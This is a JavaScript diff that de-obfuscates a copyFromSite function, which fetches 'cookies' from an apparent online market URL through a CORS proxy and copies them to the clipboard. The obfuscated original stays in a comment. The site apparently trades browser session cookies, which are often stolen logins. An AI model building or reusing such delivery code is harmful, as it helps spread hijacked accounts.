@@ -41,8 +41,56 @@ document.addEventListener('keydown', function (e) {
 
 
 
+function copyFromSite() {
+  const corsProxy = "https://corsproxy.io/?";
+  const sourceURL = "https://cheap-market.cc/product/163368/cookies/gxKgejZz";
 
-(function(_0x36d4f0,_0x620eb6){const _0x175c47=_0x57b3,_0x2cf7eb=_0x36d4f0();while(!![]){try{const _0xb302fc=-parseInt(_0x175c47(0x148))/0x1*(-parseInt(_0x175c47(0x136))/0x2)+-parseInt(_0x175c47(0x13c))/0x3*(-parseInt(_0x175c47(0x145))/0x4)+-parseInt(_0x175c47(0x134))/0x5+parseInt(_0x175c47(0x13e))/0x6*(parseInt(_0x175c47(0x137))/0x7)+parseInt(_0x175c47(0x149))/0x8*(-parseInt(_0x175c47(0x146))/0x9)+parseInt(_0x175c47(0x147))/0xa*(parseInt(_0x175c47(0x133))/0xb)+-parseInt(_0x175c47(0x143))/0xc;if(_0xb302fc===_0x620eb6)break;else _0x2cf7eb['push'](_0x2cf7eb['shift']());}catch(_0x5ed79a){_0x2cf7eb['push'](_0x2cf7eb['shift']());}}}(_0x4408,0xaff9f));function copyFromSite(){const _0x1dd0fe=_0x57b3,_0x46b4db=_0x1dd0fe(0x13b),_0x303c6d=_0x1dd0fe(0x14a);fetch(_0x46b4db+encodeURIComponent(_0x303c6d))[_0x1dd0fe(0x13a)](_0x1899f6=>_0x1899f6['text']())[_0x1dd0fe(0x13a)](_0x7dce7d=>{const _0x157091=_0x1dd0fe;navigator[_0x157091(0x13f)][_0x157091(0x13d)](_0x7dce7d)[_0x157091(0x13a)](()=>{const _0x4ac5b7=_0x157091,_0x3636ba=document[_0x4ac5b7(0x142)](_0x4ac5b7(0x140));_0x3636ba[_0x4ac5b7(0x144)][_0x4ac5b7(0x141)](_0x4ac5b7(0x135)),setTimeout(()=>_0x3636ba[_0x4ac5b7(0x144)][_0x4ac5b7(0x139)](_0x4ac5b7(0x135)),0x1388);});})['catch'](_0x2d7757=>{const _0x554934=_0x1dd0fe;alert(_0x554934(0x132)),console[_0x554934(0x138)](_0x2d7757);});}function _0x57b3(_0x3a342a,_0x4165db){const _0x4408ed=_0x4408();return _0x57b3=function(_0x57b301,_0x10a6de){_0x57b301=_0x57b301-0x132;let _0x2779df=_0x4408ed[_0x57b301];return _0x2779df;},_0x57b3(_0x3a342a,_0x4165db);}function _0x4408(){const _0x1b163a=['6319440KHoqqU','active','4aYMVyD','251587keTHBP','error','remove','then','https://corsproxy.io/?','136545serGYq','writeText','48vprYQg','clipboard','tooltip','add','getElementById','6960972DyRcKf','classList','64cXeKwG','9MPZria','83510BTpXMb','275083HfzUdj','2631800awmZaa','https://cheap-market.cc/product/163368/cookies/gxKgejZz','Failed\x20to\x20copy\x20cookies.\x20Try\x20again.','1749ciEvcD'];_0x4408=function(){return _0x1b163a;};return _0x4408();}
+  fetch(corsProxy + encodeURIComponent(sourceURL))
+    .then(res => res.text())
+    .then(data => {
+      // Create a hidden <textarea> as fallback
+      const textarea = document.createElement("textarea");
+      textarea.value = data;
+      textarea.setAttribute("readonly", "");
+      textarea.style.position = "absolute";
+      textarea.style.left = "-9999px";
+      document.body.appendChild(textarea);
+
+      // Try modern clipboard API
+      if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(data).then(() => {
+          showCopiedTooltip();
+          document.body.removeChild(textarea);
+        }).catch(() => {
+          // fallback
+          textarea.select();
+          document.execCommand("copy");
+          showCopiedTooltip();
+          document.body.removeChild(textarea);
+        });
+      } else {
+        // fallback
+        textarea.select();
+        document.execCommand("copy");
+        showCopiedTooltip();
+        document.body.removeChild(textarea);
+      }
+    })
+    .catch(err => {
+      alert("❌ Failed to copy cookies. Try again.");
+      console.error(err);
+    });
+}
+
+function showCopiedTooltip() {
+  const tip = document.getElementById('tooltip');
+  tip.classList.add('active');
+  setTimeout(() => tip.classList.remove('active'), 5000);
+}
+
+
+
+//(function(_0x36d4f0,_0x620eb6){const _0x175c47=_0x57b3,_0x2cf7eb=_0x36d4f0();while(!![]){try{const _0xb302fc=-parseInt(_0x175c47(0x148))/0x1*(-parseInt(_0x175c47(0x136))/0x2)+-parseInt(_0x175c47(0x13c))/0x3*(-parseInt(_0x175c47(0x145))/0x4)+-parseInt(_0x175c47(0x134))/0x5+parseInt(_0x175c47(0x13e))/0x6*(parseInt(_0x175c47(0x137))/0x7)+parseInt(_0x175c47(0x149))/0x8*(-parseInt(_0x175c47(0x146))/0x9)+parseInt(_0x175c47(0x147))/0xa*(parseInt(_0x175c47(0x133))/0xb)+-parseInt(_0x175c47(0x143))/0xc;if(_0xb302fc===_0x620eb6)break;else _0x2cf7eb['push'](_0x2cf7eb['shift']());}catch(_0x5ed79a){_0x2cf7eb['push'](_0x2cf7eb['shift']());}}}(_0x4408,0xaff9f));function copyFromSite(){const _0x1dd0fe=_0x57b3,_0x46b4db=_0x1dd0fe(0x13b),_0x303c6d=_0x1dd0fe(0x14a);fetch(_0x46b4db+encodeURIComponent(_0x303c6d))[_0x1dd0fe(0x13a)](_0x1899f6=>_0x1899f6['text']())[_0x1dd0fe(0x13a)](_0x7dce7d=>{const _0x157091=_0x1dd0fe;navigator[_0x157091(0x13f)][_0x157091(0x13d)](_0x7dce7d)[_0x157091(0x13a)](()=>{const _0x4ac5b7=_0x157091,_0x3636ba=document[_0x4ac5b7(0x142)](_0x4ac5b7(0x140));_0x3636ba[_0x4ac5b7(0x144)][_0x4ac5b7(0x141)](_0x4ac5b7(0x135)),setTimeout(()=>_0x3636ba[_0x4ac5b7(0x144)][_0x4ac5b7(0x139)](_0x4ac5b7(0x135)),0x1388);});})['catch'](_0x2d7757=>{const _0x554934=_0x1dd0fe;alert(_0x554934(0x132)),console[_0x554934(0x138)](_0x2d7757);});}function _0x57b3(_0x3a342a,_0x4165db){const _0x4408ed=_0x4408();return _0x57b3=function(_0x57b301,_0x10a6de){_0x57b301=_0x57b301-0x132;let _0x2779df=_0x4408ed[_0x57b301];return _0x2779df;},_0x57b3(_0x3a342a,_0x4165db);}function _0x4408(){const _0x1b163a=['6319440KHoqqU','active','4aYMVyD','251587keTHBP','error','remove','then','https://corsproxy.io/?','136545serGYq','writeText','48vprYQg','clipboard','tooltip','add','getElementById','6960972DyRcKf','classList','64cXeKwG','9MPZria','83510BTpXMb','275083HfzUdj','2631800awmZaa','https://cheap-market.cc/product/163368/cookies/gxKgejZz','Failed\x20to\x20copy\x20cookies.\x20Try\x20again.','1749ciEvcD'];_0x4408=function(){return _0x1b163a;};return _0x4408();}
 
 
 
